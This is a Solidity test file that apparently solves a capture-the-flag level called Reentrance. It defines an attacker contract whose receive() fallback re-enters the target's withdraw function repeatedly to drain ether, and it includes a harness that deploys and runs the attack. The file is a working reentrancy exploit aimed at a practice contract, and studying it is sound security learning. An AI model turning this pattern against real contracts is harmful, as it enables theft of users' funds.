// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {ReentranceFactory} from "../src/levels/10-ReentranceFactory.sol";
import {Reentrance} from "../src/levels/10-Reentrance.sol";

contract Reentrooor {
    Reentrance private target;
    uint256 private calls = 0;
    constructor(Reentrance _target) {
        target = _target;
    }

    function deposit() public payable {
        target.donate{value: msg.value}(address(this));
    }
    function attack() public {
        target.withdraw(0.001 ether);
    }

    receive() external payable {
        if(calls++ > 2) return;
        target.withdraw(0.001 ether);
    }
}

contract ReentranceSolution is BaseTest {

    function solution(address payable target_) internal override{
        Reentrance target = Reentrance(target_);
        Reentrooor reentrooor = new Reentrooor(target);
        reentrooor.deposit{value: 0.001 ether}();
        reentrooor.attack();
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new ReentranceFactory()));
    }
}
